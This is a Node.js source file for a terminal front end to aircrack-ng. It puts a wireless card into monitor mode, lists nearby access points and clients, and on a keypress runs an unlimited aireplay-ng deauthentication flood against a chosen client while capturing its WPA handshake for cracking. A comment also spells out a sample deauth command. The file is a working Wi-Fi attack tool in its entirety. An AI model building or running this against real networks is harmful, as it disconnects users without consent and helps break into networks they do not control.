'use strict';

const EventEmitter = require('events').EventEmitter;
const logUpdate = require('log-update');
const Table = require('cli-table2');
const keypress = require('keypress');
const os = require('os');
const colors = require('colors');

const airodump = require('./airodump-ng');
const aireplay = require('./aireplay-ng');
const airmon = require('./airmon-ng');
const iwconfig = require('./iwconfig');
const IFace = require('./interface');

const MONITOR = 'monitor';
const ATTACK = 'attack';
const RENDER_RATE = 500;

const tableOptions = {
  chars: {
    'top': '', 'top-mid': '', 'top-left': '', 'top-right': '', 'bottom': '', 'bottom-mid': '', 'bottom-left': '',
    'bottom-right': '', 'left': '', 'left-mid': '', 'mid': '', 'mid-mid': '', 'right': '', 'right-mid': '', 'middle': ' '
  },
  style: { 'padding-left': 0, 'padding-right': 0 }
};

keypress(process.stdin);

class AirCrackApp extends EventEmitter {

  constructor() {
    super();

    this.status = null; // App status - Monitor Or Attack
    this.handshake = false;
    this.station_index = 0;
    this.stations = [];
    this.renderTimerID = null;
    this.viewData = [];
    this.viewInfo = [];

    const self = this;

    //this.render(['Starting airodump-ng...']);

    /**
     * Methods to fireup keypress actions
     */
    this.controls = {
      a: () => self.status === MONITOR && self.emit('attack'),  // Attack BSSID <---> STATION    airodump.attack();
      up: () => self.emit('choose', 'up'), // Choose BSSID <---> STATION            airodump.moveUpStation();
      down: () => self.emit('choose', 'down'), // Choose BSSID <---> STATION       airodump.moveDownStation();
      b: () => self.status === ATTACK && self.emit('monitor'), // Go back, if attack mode   self.monitor();
      r: () => self.status === MONITOR && self.emit('reset'),
      q: () => self.emit('quit'), // Quit application
    };
  }

  init() {
    if (this.status) {
      return;
    }

    this.renderTimerID = setInterval(() => this.render(this.viewData, this.viewInfo), RENDER_RATE);

    process.stdin.setRawMode && process.stdin.setRawMode(true);
    process.stdin.resume();
    process.stdin.on('keypress', (chunk, key) => key && this.controls[key.name] && this.controls[key.name]());

    this.emit(MONITOR);
  }

  /**
   * Render to cli
   * @param data
   * @param info
   */
  render(data, info = []) {

    if (!Array.isArray(data)) {
      return;
    }

    const lines = ['', '\u001b\[J'];
    const table = new Table(tableOptions);

    data.forEach((line) => table.push(line));

    lines.push(table.toString());

    logUpdate([...lines,
      '',
      ...info,
      '\u001b\[1\;1H',
    ].join(os.EOL));
  }

  /**
   * Set data that will be rendered
   * @param data
   * @param info
   */
  setRender(data, info = []) {
    this.viewData = data;
    this.viewInfo = info;
  }

  /**
   * Set available stations from airodump parsed data
   * @param data
   */
  accumulateStations(data) {

    Object.keys(data.items).sort().forEach((STATION) => {

      const newItem = Object.assign({STATION}, data.items[STATION]);

      let index = -1;
      this.stations.forEach((item , i) => item.STATION === newItem.STATION && (index = i));

      // Update
      if (~index) {
        this.stations[index] = newItem;
      // Add new
      } else {
        this.stations.push(newItem);
      }

    });

    //if (this.stations.length) {
    //  console.log(this.stations);
    //}

    /*
    let lastIndex = this.stations.length - 1;
    lastIndex = lastIndex < 0 ? 0: lastIndex;
    if (this.station_index > lastIndex) {
      this.station_index = 0;
    }
    */
  }

  /**
   * Clean up stations prop
   */
  resetStations() {
    this.stations = [];
  }

  /**
   * Get current station object
   * @returns {*}
   */
  getStation() {
    return this.stations[this.station_index];
  }

  /**
   * Prepare Data to render in cli
   * @returns {*}
   */
  prepareMonitorRender() {

    const currIndex = this.station_index;

    // Prepare for rendering
    const fields = ['#', ...Object.keys(this.stations[0])];
    const lines = this.stations.map((station, index) => [
      (index + 1).toString(), ...Object.values(station)
    ].map((item, i) => index === currIndex && i < 3 ? item.bgRed.white : item));

    return [
      fields,
      ...lines,
      [],
      ['', `current #: ${currIndex + 1}`]
    ];
  }

  /**
   * Increment station index
   */
  incStationIndex() {
    if (this.station_index < this.stations.length - 1) {
      this.station_index++;
    } else {
      this.station_index = 0;
    }
  }

  /**
   * Decrement station index
   */
  decStationIndex() {
    if (this.station_index) {
      this.station_index--;
    } else {
      this.station_index =  this.stations.length ? this.stations.length - 1 : 0;
    }
  }

}

const self = new AirCrackApp();

const monitorDataEventHandler = (data) => {

  self.accumulateStations(data);

  if (!self.stations.length) {
    return;
  }

  self.setRender(
    self.prepareMonitorRender(),
    [
      `\ta = attack\t${String.fromCharCode(8593)}${String.fromCharCode(8595)} = choose\tr = reset\tq = quit`
    ]
  );

};

const handshakeDataEventHandler = (data) => {
  if (data.handshake) {
    self.handshake = true;
  }
};

const attackDataEventHandler = (data) => {
  const stationItem = self.getStation();

  self.setRender([
      {'HANDSHAKE': (self.handshake ? '+' : '-')},
      {'ESSID:': stationItem.ESSID},
      {'BSSID:': stationItem.BSSID},
      {'STATION:': stationItem.STATION},
      {'CHANNEL:': stationItem.CH},
      {'STATUS:': data.STATUS},
      {'ACKs:': data.ACKs}
    ],
    [
      `    b = back   q = quit`,
    ]
  );
};

self.on(MONITOR, () => {

  self.status = MONITOR;

  aireplay.stop();

  self.setRender([{'Status:': 'Starting airodump-ng...'}]);

  iwconfig.getInterfaces()
    .then((ifaceString) => new IFace(ifaceString))
    .then((iface) => iface.down())
    .then((iface) => iface.setMode(MONITOR))
    .then((iface) => iface.up())
    //.then((iface) => airmon.start(iface))
    //.then((iface) => iwconfig.getInterfaces())
    //.then((ifaceString) => new IFace(ifaceString))
    .then((iface) => airodump.run(iface))
    .then((airodump) => airodump.on('data', monitorDataEventHandler))
    .catch((error) => console.error(error));
});

self.on(ATTACK, () => {

  const stationItem = self.getStation();

  if (!stationItem) {
    return;
  }

  self.status = ATTACK;

  self.handshake = false;

  //airodump.remove('data', monitorDataEventHandler);

  self.setRender([{'Status:': 'Starting aireplay-ng...'}]);

  airodump.run(null,
    '--bssid', stationItem.BSSID,
    '-w', stationItem.ESSID,
    '-c', stationItem.CH
  ).then((airodump) => {

    airodump.on('data', handshakeDataEventHandler);

    // aireplay-ng --deauth 10 -a 64:66:B3:45:C7:F4 -c DC:85:DE:3A:53:BD  mon0
    return aireplay.run(airodump.iface,
      '--deauth', '0',
      '-a', stationItem.BSSID,
      '-c', stationItem.STATION
    );
  }).then((aireplay) => aireplay.on('data', attackDataEventHandler))
  .catch((error) => console.error(error));

});

//self.on('render', (data, info) => {
//  self.render(data, info);
//});

self.on('choose', (dir) => {
  if (dir === 'up') {
    self.decStationIndex();
  } else if(dir === 'down') {
    self.incStationIndex();
  }
});

self.on('reset', self.resetStations);

self.on('quit', () => {
  process.stdin.pause();
  process.exit();
});

module.exports = self;
